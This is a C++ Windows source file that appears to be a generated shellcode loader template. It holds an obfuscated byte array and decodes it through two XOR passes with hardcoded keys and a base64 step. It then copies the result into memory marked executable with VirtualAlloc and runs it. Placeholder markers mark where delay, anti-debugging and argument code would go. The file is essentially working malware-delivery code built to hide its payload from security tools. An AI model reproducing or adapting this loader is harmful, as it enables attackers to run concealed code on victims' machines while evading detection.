#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <wincrypt.h>


//####DEFINE####

int xor_encode_3c07b8a0bef345a48d5333f346d279c6(unsigned char* data, int data_len)
{
    const char* key = "ud=3M3j5JaWS";
    int key_len = 12;
    
    printf("\n[*] Before XOR values: {");
    for (DWORD i = 0; i < data_len; i++) {
        printf("0x%02x", data[i]);
        if (i < data_len - 1) {
            printf(",");
        }
    }
    printf("}\n");

    for (int i = 0; i < data_len; i++){
        data[i] = (data[i] ^ (unsigned char)key[i % key_len]);
    }


    printf("\n[*] After XOR values: {");
    for (DWORD i = 0; i < data_len; i++) {
        printf("0x%02x", data[i]);
        if (i < data_len - 1) {
            printf(",");
        }
    }
    printf("}\n");

    return data_len;
}
int base64_decode_24192b8ddbf84441ba41245dc3550100(unsigned char* encoded, int length)
 {


    printf("\n[*] Before BASE64 values: {");
    for (DWORD i = 0; i < length; i++) {
        printf("0x%02x", encoded[i]);
        if (i < length - 1) {
            printf(",");
        }
    }
    printf("}\n");

    DWORD dwDecodedSize = 0;
    BOOL result = CryptStringToBinaryA((LPCSTR)encoded, length, CRYPT_STRING_BASE64, NULL, &dwDecodedSize, NULL, NULL);
    if (!result) {
        printf("[-] Error calculating decoded size\n");
        return -1;
    }

    unsigned char* decoded = (unsigned char*)malloc(dwDecodedSize);
    if (decoded == NULL) {
        printf("[-] Memory allocation failed\n");
        return -1;
    }

    result = CryptStringToBinaryA((LPCSTR)encoded, length, CRYPT_STRING_BASE64, decoded, &dwDecodedSize, NULL, NULL);
    if (!result) {
        printf("[-] Error decoding base64\n");
        free(decoded);
        return -1;
    }

    // Debug statement to print the decoded values
    printf("\n[*] After BASE64 values: {");
    for (DWORD i = 0; i < dwDecodedSize; i++) {
        printf("0x%02x", decoded[i]);
        if (i < dwDecodedSize - 1) {
            printf(",");
        }
    }
    printf("}\n");

    memcpy(encoded, decoded, dwDecodedSize);
    free(decoded);

    return dwDecodedSize;
}int xor_encode_24199a383c834955a6623fc7500b7ab3(unsigned char* data, int data_len)
{
    const char* key = "EQhJUGSFJG(F";
    int key_len = 12;
    
    printf("\n[*] Before XOR values: {");
    for (DWORD i = 0; i < data_len; i++) {
        printf("0x%02x", data[i]);
        if (i < data_len - 1) {
            printf(",");
        }
    }
    printf("}\n");

    for (int i = 0; i < data_len; i++){
        data[i] = (data[i] ^ (unsigned char)key[i % key_len]);
    }


    printf("\n[*] After XOR values: {");
    for (DWORD i = 0; i < data_len; i++) {
        printf("0x%02x", data[i]);
        if (i < data_len - 1) {
            printf(",");
        }
    }
    printf("}\n");

    return data_len;
}



DWORD WINAPI esc_main(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    const unsigned char raw[] = {0x00,0x36,0x53,0x41,0x3f,0x42,0x3d,0x43,0x21,0x51,0x0d,0x18,0x27,0x56,0x56,0x6b,0x0f,0x72,0x2f,0x03,0x0d,0x16,0x1a,0x03,0x2c,0x14,0x6c,0x45,0x09,0x05,0x27,0x60,0x00,0x33,0x39,0x39,0x32,0x21,0x0d,0x63,0x7f,0x71,0x38,0x44,0x0e,0x57,0x1a,0x63,0x33,0x36,0x51,0x5d,0x62,0x61,0x52,0x7b,0x02,0x0f,0x32,0x17,0x31,0x1c,0x50,0x74,0x7b,0x64,0x5a,0x7f,0x04,0x0d,0x33,0x21,0x16,0x13,0x58,0x7f,0x27,0x5a,0x3f,0x7d,0x18,0x2b,0x14,0x18,0x05,0x13,0x5e,0x74,0x0c,0x54,0x5d,0x77,0x0c,0x30,0x3d,0x1d,0x37,0x56,0x0d,0x54,0x1e,0x07,0x32,0x78,0x7a,0x59,0x62,0x18,0x27,0x1d,0x5a,0x7c,0x3a,0x79,0x2f,0x56,0x06,0x33,0x66,0x14,0x12,0x1c,0x5f,0x71,0x09,0x49,0x2b,0x76,0x30,0x09,0x11,0x1a,0x34,0x55,0x6e,0x6b,0x3e,0x71,0x2b,0x76,0x3f,0x2e,0x12,0x1b,0x0f,0x09,0x65,0x54,0x0c,0x5f,0x39,0x67,0x02,0x0f,0x32,0x17,0x31,0x1c,0x50,0x74,0x7b,0x61,0x29,0x45,0x2d,0x50,0x30,0x14,0x20,0x0b,0x59,0x4a,0x3d,0x02,0x58,0x06,0x09,0x37,0x1e,0x38,0x17,0x08,0x0d,0x70,0x2c,0x43,0x09,0x1a,0x24,0x52,0x16,0x10,0x0f,0x0c,0x7b,0x7e,0x0c,0x02,0x39,0x6d,0x04,0x30,0x31,0x11,0x26,0x56,0x7c,0x70,0x37,0x5b,0x2c,0x05,0x0b,0x50,0x04,0x0b,0x30,0x17,0x0c,0x7c,0x37,0x01,0x28,0x7d,0x26,0x33,0x16,0x24,0x36,0x13,0x0d,0x69,0x0e,0x5b,0x1d,0x79,0x02,0x53,0x3c,0x35,0x37,0x25,0x4e,0x54,0x34,0x51,0x06,0x5b,0x0f,0x09,0x04,0x62,0x05,0x57,0x7c,0x7b,0x05,0x72,0x19,0x52,0x3d,0x34,0x32,0x26,0x37,0x28,0x50,0x02,0x38,0x7b,0x3f,0x7a,0x65,0x50,0x15,0x3c,0x26,0x08,0x6b,0x7b,0x18,0x03,0x30,0x7e,0x0e,0x57,0x0f,0x1f,0x27,0x22,0x7f,0x5c,0x1e,0x5b,0x3e,0x0c,0x13,0x12,0x67,0x3f,0x02,0x2a,0x58,0x67,0x62,0x42,0x22,0x51,0x7c,0x20,0x1a,0x14,0x43,0x01,0x79,0x55,0x66,0x41,0x3d,0x00,0x21,0x23,0x39,0x21,0x1f,0x0a,0x0c,0x04,0x1b,0x67,0x1a,0x74,0x32,0x58,0x18,0x3e,0x38,0x22,0x69,0x67,0x09,0x66,0x33,0x04,0x1a,0x22,0x2f,0x18,0x3d,0x09,0x53,0x63,0x23,0x05,0x5c,0x0c,0x01,0x35,0x06,0x21,0x38,0x23,0x5a,0x45,0x1d,0x03,0x5b,0x72};
    int length = sizeof(raw);

    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
    memcpy(encoded, raw, length);
    //SIZE_T bytesWritten;

    length = xor_encode_3c07b8a0bef345a48d5333f346d279c6(encoded, length);length = base64_decode_24192b8ddbf84441ba41245dc3550100(encoded, length);length = xor_encode_24199a383c834955a6623fc7500b7ab3(encoded, length);

    unsigned char* decoded = encoded;

    //currentProcess = GetCurrentProcess();

    printf("[*] Allocating %d bytes of memory\n", length);
    void *exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL)
        return -1;

    bool success = false;
    success = memcpy(exec, decoded, length);
    if (!success){
        printf("[-] Oh gosh, something went wrong!\n");
        return -2;
    }
    
    int ret_val = 0;
    printf("[*] Executing\n");
    ((void (*)())exec)();
    
    printf("[+] The shellcode finished with a return value: %08X\n", ret_val);
    return 0;
}

int main()
{
    //####DELAY####
    //####ANTIDEBUG####
    //####ARGS####

    esc_main(NULL);
}
